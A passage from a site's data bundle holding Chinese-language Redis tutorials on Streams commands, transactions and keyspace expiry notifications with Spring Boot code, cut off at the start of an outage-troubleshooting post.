有一个类似实现，和 kafka 的 consumer groups 的目的是一样的：允许一组客户端协调消费相同的信息流！\n\n\n# streams 基础\n\n为了理解 streams 的目的，以及如何使用它，我们先忽略掉所有高级特性，只把注意力放在数据结构本身，以及那些操作和访问 streams 的命令。这基本上也是大多数其他 redis 数据类型共有的部分，例如 lists，sets，sorted sets 等。然而需要注意的是，lists 也有一个更复杂的阻塞式的 api，例如 blpop，brpop 等。streams 这方便的 api 也没什么不同，只是更复杂，更强大（更牛逼，哈）！\n\n\n# streams 命令\n\n废话不多说，先上手玩玩这个全新的数据类型。streams 这个数据类型对应有如下 13 个操作命令，所有命令都以 "x" 开头：\nxadd\n\n * 用法：xadd key id field string [field string …]\n\n * 正如其名，这个命令就是用来添加的，给 streams 追加（append，前面提到过：streams 主要是一个 append only 的数据结构）一个新的 entry（和 java 里的 map 类似，redis 里的 streams 中的数据也称为 entry）。\n\n * key：的含义就是同一类型 streams 的名称；\n\n * id: streams 中 entry 的唯一标识符，如果执行 xadd 命令时，传入星号（*），那么，id 会自动生成，且自动生成的 id 会在执行 xadd 后返回，默认生成的 id 格式为 millisecondstime+sequencenumber，即当前毫秒级别的时间戳加上一个自增序号值，例如 "1540013735401-0"。并且执行 xadd 时，不接受少于或等于上一次执行 xadd 的 id，否则会报错：err the id specified in xadd is equal or smaller than the target stream top item；\n\n * field&string：接下来就是若干组 field string。可以把它理解为表示属性的 json 中的 key-value。例如，某一 streams 的 key 命名为 userinfo，且某个用户信息为 {"username":"afei", "password":"123456"}，那么执行 xadd 命令如下：\n\n127.0.0.1:6379> xadd userinfo * name afei password 123456\n"1594456377383-0"\n127.0.0.1:6379> \n\n\n1\n2\n3\n\n\n由于命令中 id 字段的值是 * ，所以自定生成 id，1594456377383-0 就是自动生成的 id。 xadd 命令也支持显示指定 id，例如：xadd key 0-2 field string。\n\n需要注意的是，id 的时间戳部分是部署 redis 服务器的本地时间，如果发生时钟回拨会怎么样？如果发生时钟回拨，生成的 id 的时间戳部分就是回拨后的时间，然后加上这个时间的递增序列号。例如当前时间戳 1540014082060，然后这时候发生了时钟回拨，且回拨 5ms，那么时间戳就是 1540014082055。假设以前已经生成了 1540014082055-0，1540014082055-1，那么这次由于时钟回拨，生成的 id 就是 1540014082055-2。所以允许自动生成的 id 在发生时钟回拨时少于上次的 id，但是不允许显示指定一个少于上次的 id。\n\n如果我们以相同的 key 插入一遍，他不会像普通的 key-value 一样做替换，而是在相同 key 维护这一个列表。\n\nxdel\n\n * 用法：xdel key id [id …]\n   和 xadd 相反，这是命令用来从 streams 中删除若干个 entry，并且会返回实际删除数，这个删除数可能和参数 id 个数不等，因为某些 id 表示的消息可能不存在。执行命令如下，第二个参数 id 是不存在的，所以 xdel 的返回结果是 1：\n\n127.0.0.1:6379> xdel userinfo 1594456377383-0\n(integer) 1\n\n\n1\n2\n\n\nxlen\n\n * 用法：xlen key\n   很好理解，这个命令就是用来返回相同 key 的数量，上面又说相同 key 是不会覆盖的，是维护了一个列表，所以这个是相同 key 列表的 size。执行如下：\n\n127.0.0.1:6379> xadd user * name zhangsan\n"1594457206541-0"\n127.0.0.1:6379> xlen user\n(integer) 1\n127.0.0.1:6379> xadd user * name zhangsan sex 0 \n"1594457274424-0"\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> xadd user * name zhangsan sex 0 password 123\n"1594457287981-0"\n127.0.0.1:6379> xlen user\n(integer) 3\n127.0.0.1:6379> xdel user 1594457287981-0\n(integer) 1\n127.0.0.1:6379> xlen user\n(integer) 2\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# streams 三种查询模式\n\nredis 提供了三种查询 streams 数据的模式：\n\n * 范围查询：因为 streams 的每个 entry，其默认生成的 id 是基于时间且递增的；\n\n * 监听模式：类比 linux 中的 tailf 命令，实时接收新增加到 streams 中的 entry（也有点像一个消息系统，事实上笔者认为它就是借鉴了 kafka）；\n\n * 消费者组：即 consumer groups，特殊的监听模式。从一个消费者的角度来看 streams，一个 streams 能被分区到多个处理消息的消费者，对于任意一条消息，同一个消费者组中只有一个消费者可以处理（和 kafka 的消费者组完全一样）。这样还能够横向扩容消费者，从而提升处理消息的能力，而不需要只让把让一个消费者处理所有消息。\n\nxrange\n\n * 用法：xrange key start end [count count]\n   这个命令属于第 1 种模式，即基于范围查询。这个命令用来返回 streams 某个顺序范围下的元素，start 参数是更小的 id，end 参数是更大的 id。有两个特殊的 id 用符号 "-" 和 "+" 表示，符号 "-" 表示最小的 id，符号 "+" 表示最大的 id：\n\n127.0.0.1:6379> xrange user 1540014096298-0 1594457274424-0\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n127.0.0.1:6379> xrange user - +\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n3) 1) "1594458356220-0"\n   2) 1) "name"\n      2) "wu"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nxrange 还能实现遍历某个范围区间的功能，例如我想遍历 2018-10-20 号新增的用户信息。首先得到 2018-10-20 00:00:00 对应的时间戳为 1539964800000，再得到 2018-10-20 23:59:59 对应的时间戳为 1540051199000，然后执行如下命令：\n\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 1\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n127.0.0.1:6379> xrange user 1594457206541-0 1594458356220-0 count 2\n1) 1) "1594457206541-0"\n   2) 1) "name"\n      2) "zhangsan"\n2) 1) "1594457274424-0"\n   2) 1) "name"\n      2) "zhangsan"\n      3) "sex"\n      4) "0"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nxrevrange\n\n * 用法：xrevrange key end start [count count]\n   这个命令也属于第 1 种模式，且和 xrange 相反，返回一个逆序范围。end 参数是更大的 id，start 参数是更小的 id\n\nxread\n\n * 用法：xread [count count] [block milliseconds] streams key [key …] id [id …]\n   很明显，这个命令就是用来实现第 2 个模式，即监听模式。其作用是返回 streams 中从来没有读取的，且比参数 id 更大的元素。\n   这里我开了两个窗口测试，且第一个没有做新增，第二个做了新增.\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n\n\n\n(nil)\n(60.02s)\n\n\n1\n2\n3\n4\n5\n6\n\n\n127.0.0.1:6379> xread count 10 block 60000 streams user 1594458356220-0\n1) 1) "user"\n   2) 1) 1) "1594458985980-0"\n         2) 1) "name"\n            2) "ceshi"\n(13.37s)\n127.0.0.1:6379> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n使用 xread 会阻塞特定时间，等待比我 id 大的数据，如果使用最小 id 进行测试，会跟 xrange user - + 效果是一样的。\n\n注意：block 为 0 表示一致等待知道有新的数据，否则永远不会超时。并且 id 的值我们用特殊字符 $ 表示，这个特殊字符表示我们只获取最新添加的消息。\n\n127.0.0.1:6379> xread count 10 block 0 streams user $\n\n\n\n\n1\n2\n3\n\n\nxread 还支持同时监听多个 streams\n\n127.0.0.1:6379> xread block 0 streams user_01 user_02 user_03 user_04  $ $ $ $\n\n\n\n\n\n1\n2\n3\n4\n\n\nxread 除了 count 和 block，没有其他选项了。所有 xread 是一个非常基本的命令。更多高级特性可以往下看接下来要介绍的 xreadgroup。\n\nxreadgroup\n\n * 用法：xreadgroup group group consumer [count count] [block milliseconds] streams key [key …] id [id …]\n   很明显，这就是第三种模式：消费者组模式。\n * 如果你了解 kafka 的消费者组，那么你就也了解了 streams 的消费者组。如果不了解也没关系，笔者简单解释一下，假设有三个消费者 c1，c2，c3。在 streams 中总计有 7 条消息：1， 2， 3， 4， 5， 6， 7，那么消费关系如下所示：\n   1 -> c1\n   2 -> c2\n   3 -> c3\n   4 -> c1\n   5 -> c2\n   6 -> c3\n   7 -> c1\n * 消费者组具备如下几个特点：\n   \n   * 同一个消息不会被投递到一个消费者组下的多个消费者，只可能是一个消费者。\n   \n   * 同一个消费者组下，每个消费者都是唯一的，通过大小写敏感的名字区分。\n   \n   * 消费者组中的消费者请求的消息，一定是新的，从来没有投递过的消息。\n   \n   * 消费一个消息后，需要用命令（xack）确认，意思是说：这条消息已经给成功处理。正因为如此，当访问 streams 的历史消息时，每个消费者只能看到投递给它自己的消息。\n\nxack\n\n * 用法：xack key group id [id …]\n * 这是消费者组相关的另一个重要的命令。标记一个处理中的消息为已被正确处理，如此一来，这条消息就会被从消费者组的 pending 消息集合中删除，类似 mq 中的 ack。\n\nxgroup\n\n * 用法：xgroup create key groupname id\n * 这也是消费者组的一个重要命令，这个命令用来管理消费者组，例如创建，删除等。\n   xreadgroup，xack，xgroup 三种命令构成了消费者组相关的操作命令。\n   目前 xgroup create 的 streams 必须是一个存在的 streams，否则会报错。\n   创建一个消费组\n\n127.0.0.1:6379> xgroup create user grp-afei $\nok\n\n\n1\n2\n',charsets:{cjk:!0}},{title:"Redis事务介绍",frontmatter:{title:"Redis事务介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1603",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1603.Redis%E4%BA%8B%E5%8A%A1%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/03.redis/1603.Redis事务介绍.md",key:"v-082b0d2c",path:"/Redis/1603/",headers:[{level:2,title:"redis事务网络中断或者服务停止宕机的修复方式",slug:"redis事务网络中断或者服务停止宕机的修复方式",normalizedTitle:"redis 事务网络中断或者服务停止宕机的修复方式",charIndex:485},{level:2,title:"redis事务相关命令",slug:"redis事务相关命令",normalizedTitle:"redis 事务相关命令",charIndex:904}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"redis事务网络中断或者服务停止宕机的修复方式 redis事务相关命令",content:"Redis 支持事务，但只支持事务中 (A-> 原子性 C-> 一致性 I-> 隔离性 D-> 持久性) A 和 I，使用 Redis 事务要注意以下两点：\n1. 在一个 Redis 事务中，Redis 要么执行其中的所有命令，要么什么都不执行。因此，Redis 事务能够保证原子性。\n2.Redis 会将一个事务中的所有命令序列化，然后按顺序执行。Redis 不可能在一个 Redis 事务的执行过程中插入执行另一个客户端发出的请求。这样便能保证 Redis 将这些命令作为一个单独的隔离操作执行。\n\n我们正常的观念认为，当执行某一个事务中，有报错就会回滚数据，Redis 并不是这样处理的。 首先明确阐述 Redis 是没有回滚的。然后我们探讨一直性的问题，Redis 一直性的处理方式是，如果语法上明确的出现 ERROR，会认为整个事务就是 ERROR，但数据上出现 ERROR，其余命令还是会成功。 以下是语法出错，这个事务也就是错误的，可无休止的键入命令，但都不会成功。\n\n\n\n以下是，数据错误，有重复的 key 出现，但并不影响其余命令的操作。\n\n\n\n\n# redis 事务网络中断或者服务停止宕机的修复方式\n\n当某个客户端正在执行一次事务时，如果它在调用 MULTI 命令之前就从 Redis 服务端断开连接，那么就不会执行事务中的任何操作；相反，如果它在调用 EXEC 命令之后才从 Redis 服务端断开连接，那么就会执行事务中的所有操作。当 Redis 使用只增文件（AOF：Append-only File）时，Redis 能够确保使用一个单独的 write (2) 系统调用，这样便能将事务写入磁盘。\n\n如果 Redis 服务器宕机，或者系统管理员以某种方式停止 Redis 服务进程的运行，那么 Redis 很有可能只执行了事务中的一部分操作。Redis 将会在重新启动时检查上述状态，然后退出运行，并且输出报错信息。\n\n使用 redis-check-aof 工具可以修复上述的只增文件，这个工具将会从上述文件中删除执行不完全的事务，这样 Redis 服务器才能再次启动。\n\n\n# redis 事务相关命令\n\nMULTI -> 用于标记事务块的开始。Redis 会将后续的命令逐个放入队列中，然后才能使用 EXEC 命令原子化地执行这个命令序列。这个命令的返回值是一个简单的字符串，总是 OK。\n\nEXEC -> 在一个事务中执行所有先前放入队列的命令，然后恢复正常的连接状态。当使用 WATCH 命令时，只有当受监控的键没有被修改时，EXEC 命令才会执行事务中的命令，这种方式利用了检查再设置（CAS）的机制。这个命令的返回值是一个数组，其中的每个元素分别是原子化事务中的每个命令的返回值。 当使用 WATCH 命令时，如果事务执行中止，那么 EXEC 命令就会返回一个 Null 值。\n\nDISCARD -> 清除所有先前在一个事务中放入队列的命令，然后恢复正常的连接状态。如果使用了 WATCH 命令，那么 DISCARD 命令就会将当前连接监控的所有键取消监控。这个命令的返回值是一个简单的字符串，总是 OK。\n\n\n\nWATCH -> 当某个事务需要按条件执行时，就要使用这个命令将给定的键设置为受监控的。这个命令的返回值是一个简单的字符串，总是 OK。对于每个键来说，时间复杂度总是 O (1)。\n\n以下演示了 watch 乐观锁 的示例，(1) 当一个客户端 (A) 对一个变量 (a) 进行了监听此时 a = 3 并开启了事务，另一个客户端 (B) 改变了 a 的值 a = 4，那么 (A) 客户端执行完事务后，exec 会返回 nil (null) ，(2) 如果没有竞争，则正确执行。\n\n\n\n\n\nwatch 一定是和事务一起使用才有效。\n\nUNWATCH -> 清除所有先前为一个事务监控的键。如果你调用了 EXEC 或 DISCARD 命令，那么就不需要手动调用 UNWATCH 命令。这个命令的返回值是一个简单的字符串，总是 OK。",normalizedContent:"redis 支持事务，但只支持事务中 (a-> 原子性 c-> 一致性 i-> 隔离性 d-> 持久性) a 和 i，使用 redis 事务要注意以下两点：\n1. 在一个 redis 事务中，redis 要么执行其中的所有命令，要么什么都不执行。因此，redis 事务能够保证原子性。\n2.redis 会将一个事务中的所有命令序列化，然后按顺序执行。redis 不可能在一个 redis 事务的执行过程中插入执行另一个客户端发出的请求。这样便能保证 redis 将这些命令作为一个单独的隔离操作执行。\n\n我们正常的观念认为，当执行某一个事务中，有报错就会回滚数据，redis 并不是这样处理的。 首先明确阐述 redis 是没有回滚的。然后我们探讨一直性的问题，redis 一直性的处理方式是，如果语法上明确的出现 error，会认为整个事务就是 error，但数据上出现 error，其余命令还是会成功。 以下是语法出错，这个事务也就是错误的，可无休止的键入命令，但都不会成功。\n\n\n\n以下是，数据错误，有重复的 key 出现，但并不影响其余命令的操作。\n\n\n\n\n# redis 事务网络中断或者服务停止宕机的修复方式\n\n当某个客户端正在执行一次事务时，如果它在调用 multi 命令之前就从 redis 服务端断开连接，那么就不会执行事务中的任何操作；相反，如果它在调用 exec 命令之后才从 redis 服务端断开连接，那么就会执行事务中的所有操作。当 redis 使用只增文件（aof：append-only file）时，redis 能够确保使用一个单独的 write (2) 系统调用，这样便能将事务写入磁盘。\n\n如果 redis 服务器宕机，或者系统管理员以某种方式停止 redis 服务进程的运行，那么 redis 很有可能只执行了事务中的一部分操作。redis 将会在重新启动时检查上述状态，然后退出运行，并且输出报错信息。\n\n使用 redis-check-aof 工具可以修复上述的只增文件，这个工具将会从上述文件中删除执行不完全的事务，这样 redis 服务器才能再次启动。\n\n\n# redis 事务相关命令\n\nmulti -> 用于标记事务块的开始。redis 会将后续的命令逐个放入队列中，然后才能使用 exec 命令原子化地执行这个命令序列。这个命令的返回值是一个简单的字符串，总是 ok。\n\nexec -> 在一个事务中执行所有先前放入队列的命令，然后恢复正常的连接状态。当使用 watch 命令时，只有当受监控的键没有被修改时，exec 命令才会执行事务中的命令，这种方式利用了检查再设置（cas）的机制。这个命令的返回值是一个数组，其中的每个元素分别是原子化事务中的每个命令的返回值。 当使用 watch 命令时，如果事务执行中止，那么 exec 命令就会返回一个 null 值。\n\ndiscard -> 清除所有先前在一个事务中放入队列的命令，然后恢复正常的连接状态。如果使用了 watch 命令，那么 discard 命令就会将当前连接监控的所有键取消监控。这个命令的返回值是一个简单的字符串，总是 ok。\n\n\n\nwatch -> 当某个事务需要按条件执行时，就要使用这个命令将给定的键设置为受监控的。这个命令的返回值是一个简单的字符串，总是 ok。对于每个键来说，时间复杂度总是 o (1)。\n\n以下演示了 watch 乐观锁 的示例，(1) 当一个客户端 (a) 对一个变量 (a) 进行了监听此时 a = 3 并开启了事务，另一个客户端 (b) 改变了 a 的值 a = 4，那么 (a) 客户端执行完事务后，exec 会返回 nil (null) ，(2) 如果没有竞争，则正确执行。\n\n\n\n\n\nwatch 一定是和事务一起使用才有效。\n\nunwatch -> 清除所有先前为一个事务监控的键。如果你调用了 exec 或 discard 命令，那么就不需要手动调用 unwatch 命令。这个命令的返回值是一个简单的字符串，总是 ok。",charsets:{cjk:!0}},{title:"Redis的key失效通知介绍",frontmatter:{title:"Redis的key失效通知介绍",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1604",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1604.Redis%E7%9A%84key%E5%A4%B1%E6%95%88%E9%80%9A%E7%9F%A5%E4%BB%8B%E7%BB%8D.html",relativePath:"02.中间件/03.redis/1604.Redis的key失效通知介绍.md",key:"v-eca50964",path:"/Redis/1604/",headers:[{level:2,title:"修改 redis.conf 配置",slug:"修改-redis-conf-配置",normalizedTitle:"修改 redis.conf 配置",charIndex:2},{level:2,title:"spring boot redis key 失效通知配置",slug:"spring-boot-redis-key-失效通知配置",normalizedTitle:"spring boot redis key 失效通知配置",charIndex:815},{level:3,title:"添加配置类",slug:"添加配置类",normalizedTitle:"添加配置类",charIndex:848},{level:3,title:"接口",slug:"接口",normalizedTitle:"接口",charIndex:3496},{level:3,title:"实现类",slug:"实现类",normalizedTitle:"实现类",charIndex:3875}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"修改 redis.conf 配置 spring boot redis key 失效通知配置 添加配置类 接口 实现类",content:'# 修改 redis.conf 配置\n\n找到 notify-keyspace-events 并将 notify-keyspace-events 修改为 notify-keyspace-events Ex\n\n\n\n配置 Ex 对应的意思如下： E: 键事件通知，以 __keysevent@<db>__ 为前缀 x: 过期事件（每次 key 过期时生成）\n\n * K 键空间通知，以 __keyspace@<db>__ 为前缀\n * E 键事件通知，以 __keysevent@<db>__ 为前缀\n * g del , expipre , rename 等类型无关的通用命令的通知，...\n * $ String 命令\n * l List 命令\n * s Set 命令\n * h Hash 命令\n * z 有序集合命令\n * x 过期事件（每次 key 过期时生成）\n * e 驱逐事件（当 key 在内存满了被清除时生成）\n * A g$lshzxe 的别名，因此”AKE” 意味着所有的事件\n\nnotify-keyspace-events选项\n服务器配置的notify-keyspace-events选项决定了服务器所发送通知的类型：\n可以设置的类型如下：\n想让服务器发送所有类型的键空间通知和键事件通知，可以将选项的值设置为AKE\n想让服务器发送所有类型的键空间通知，可以将选项的值设置为AK\n想让服务器发送所有类型的键事件通知，可以将选项的值设置为AE\n想让服务器只发送和字符串键有关的键空间通知，可以将选项的值设置为K$\n想让服务器只发送和列表键有关的键事件通知，可以将选项的值设置为El\n备注：notify-keyspace-events选项的默认值为空，所以如果不设置上面的值，SUBSCRIBE命令不会有任何效果\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n其中原理就是使用了 redis 的发布订阅功能。\n\n\n# spring boot redis key 失效通知配置\n\n\n# 添加配置类\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.boot.autoconfigure.condition.ConditionalOnBean;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.data.redis.connection.MessageListener;\nimport org.springframework.data.redis.connection.RedisConnectionFactory;\nimport org.springframework.data.redis.listener.ChannelTopic;\nimport org.springframework.data.redis.listener.RedisMessageListenerContainer;\nimport org.springframework.data.redis.listener.adapter.MessageListenerAdapter;\n\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.stream.Collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@Configuration\n@ConditionalOnBean(ReceiveNoticeMessage.class)\n@Slf4j\npublic class RedisNoticeConfig {\n\n    @Value("${spring.redis.database:0}")\n    private Integer db;\n\n    @Autowired\n    ReceiveNoticeMessage receiveNoticeMessage;\n\n    /**\n     * 将 Receiver注册为一个消息监听器，并指定消息接收的方法(expiredMessage)\n     * 如果不指定消息接收的方法，消息监听器会默认的寻找Receiver中的handleMessage这个方法做为消息接收的方式\n    **/\n    @Bean\n    MessageListener messageListener(){\n        return new MessageListenerAdapter(receiveNoticeMessage(),"noticeMessage");\n    }\n\n    @Bean\n    ReceiveNoticeMessage receiveNoticeMessage(){\n        return receiveNoticeMessage;\n    }\n\n    /**\n     * 设置监听类型\n    **/\n    @Bean\n    public List<ChannelTopic> channelTopic(){\n        String name = "__keyevent@"+db.intValue()+"__:%s";\n        List<String> commands = Arrays.asList("set","lpush","expired");\n        return commands.stream().map(i -> new ChannelTopic(String.format(name,i))).collect(Collectors.toList());\n    }\n\n    /**\n     * 通过 RedisMessageListenerContainer 配置监听生效\n    **/\n    @Bean\n    public RedisMessageListenerContainer redisMessageListenerContainer(@Autowired RedisConnectionFactory redisConnectionFactory){\n        RedisMessageListenerContainer redisMessageListenerContainer = new RedisMessageListenerContainer();\n        redisMessageListenerContainer.setConnectionFactory(redisConnectionFactory);\n        redisMessageListenerContainer.addMessageListener(messageListener(),channelTopic());\n        return redisMessageListenerContainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# 接口\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface ReceiveNoticeMessage {\n    /**\n     * 失效接收方法\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticeMessage(String key,String channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 实现类\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.ReceiveNoticeMessage;\nimport lombok.extern.slf4j.Slf4j;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@Component\n@Slf4j\npublic class RedisKeyMonitor implements ReceiveNoticeMessage {\n\n    @Override\n    public void noticeMessage(String key,String channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',normalizedContent:'# 修改 redis.conf 配置\n\n找到 notify-keyspace-events 并将 notify-keyspace-events 修改为 notify-keyspace-events ex\n\n\n\n配置 ex 对应的意思如下： e: 键事件通知，以 __keysevent@<db>__ 为前缀 x: 过期事件（每次 key 过期时生成）\n\n * k 键空间通知，以 __keyspace@<db>__ 为前缀\n * e 键事件通知，以 __keysevent@<db>__ 为前缀\n * g del , expipre , rename 等类型无关的通用命令的通知，...\n * $ string 命令\n * l list 命令\n * s set 命令\n * h hash 命令\n * z 有序集合命令\n * x 过期事件（每次 key 过期时生成）\n * e 驱逐事件（当 key 在内存满了被清除时生成）\n * a g$lshzxe 的别名，因此”ake” 意味着所有的事件\n\nnotify-keyspace-events选项\n服务器配置的notify-keyspace-events选项决定了服务器所发送通知的类型：\n可以设置的类型如下：\n想让服务器发送所有类型的键空间通知和键事件通知，可以将选项的值设置为ake\n想让服务器发送所有类型的键空间通知，可以将选项的值设置为ak\n想让服务器发送所有类型的键事件通知，可以将选项的值设置为ae\n想让服务器只发送和字符串键有关的键空间通知，可以将选项的值设置为k$\n想让服务器只发送和列表键有关的键事件通知，可以将选项的值设置为el\n备注：notify-keyspace-events选项的默认值为空，所以如果不设置上面的值，subscribe命令不会有任何效果\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n其中原理就是使用了 redis 的发布订阅功能。\n\n\n# spring boot redis key 失效通知配置\n\n\n# 添加配置类\n\npackage com.giant.cloud.config;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.beans.factory.annotation.value;\nimport org.springframework.boot.autoconfigure.condition.conditionalonbean;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.data.redis.connection.messagelistener;\nimport org.springframework.data.redis.connection.redisconnectionfactory;\nimport org.springframework.data.redis.listener.channeltopic;\nimport org.springframework.data.redis.listener.redismessagelistenercontainer;\nimport org.springframework.data.redis.listener.adapter.messagelisteneradapter;\n\nimport java.util.arrays;\nimport java.util.list;\nimport java.util.stream.collectors;\n\n/**\n * @author big uncle\n * @date 2020/7/13 16:24\n * @module\n **/\n@configuration\n@conditionalonbean(receivenoticemessage.class)\n@slf4j\npublic class redisnoticeconfig {\n\n    @value("${spring.redis.database:0}")\n    private integer db;\n\n    @autowired\n    receivenoticemessage receivenoticemessage;\n\n    /**\n     * 将 receiver注册为一个消息监听器，并指定消息接收的方法(expiredmessage)\n     * 如果不指定消息接收的方法，消息监听器会默认的寻找receiver中的handlemessage这个方法做为消息接收的方式\n    **/\n    @bean\n    messagelistener messagelistener(){\n        return new messagelisteneradapter(receivenoticemessage(),"noticemessage");\n    }\n\n    @bean\n    receivenoticemessage receivenoticemessage(){\n        return receivenoticemessage;\n    }\n\n    /**\n     * 设置监听类型\n    **/\n    @bean\n    public list<channeltopic> channeltopic(){\n        string name = "__keyevent@"+db.intvalue()+"__:%s";\n        list<string> commands = arrays.aslist("set","lpush","expired");\n        return commands.stream().map(i -> new channeltopic(string.format(name,i))).collect(collectors.tolist());\n    }\n\n    /**\n     * 通过 redismessagelistenercontainer 配置监听生效\n    **/\n    @bean\n    public redismessagelistenercontainer redismessagelistenercontainer(@autowired redisconnectionfactory redisconnectionfactory){\n        redismessagelistenercontainer redismessagelistenercontainer = new redismessagelistenercontainer();\n        redismessagelistenercontainer.setconnectionfactory(redisconnectionfactory);\n        redismessagelistenercontainer.addmessagelistener(messagelistener(),channeltopic());\n        return redismessagelistenercontainer;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n\n\n\n# 接口\n\npackage com.giant.cloud.support;\n\n/**\n * @author big uncle\n * @date 2020/7/13 17:13\n **/\npublic interface receivenoticemessage {\n    /**\n     * 失效接收方法\n     * @author big uncle\n     * @date 2020/7/13 17:14\n     * @param key\n     * @param channel\n     * @return void\n    **/\n    void noticemessage(string key,string channel);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 实现类\n\npackage com.giant.cloud.monitor;\n\nimport com.giant.cloud.support.receivenoticemessage;\nimport lombok.extern.slf4j.slf4j;\nimport org.springframework.stereotype.component;\n\n/**\n * @author big uncle\n * @date 2020/10/9 17:49\n * @module\n **/\n@component\n@slf4j\npublic class rediskeymonitor implements receivenoticemessage {\n\n    @override\n    public void noticemessage(string key,string channel) {\n        log.debug("key is {}, channel is {}",key,channel);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0}},{title:"Redis记一次宕机排查",frontmatter:{title:"Redis记一次宕机排查",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1606.Redis%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%95%E6%9C%BA%E6%8E%92%E6%9F%A5.html",relativePath:"02.中间件/03.redis/1606.Redis记一次宕机排查.md",key:"v-5ff80878",path:"/Redis/1606/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"最近公司要做一天 8 亿级数据的缓存，然后让我对 redis 进行一波性能测试，但是今天发现 redis 突然没有在运行，并且内存没有任何占用情况。然后我就想到先查看日志，如下\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           Redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     Running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379\n |    `-._   `._    /     _.-'    |     PID: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        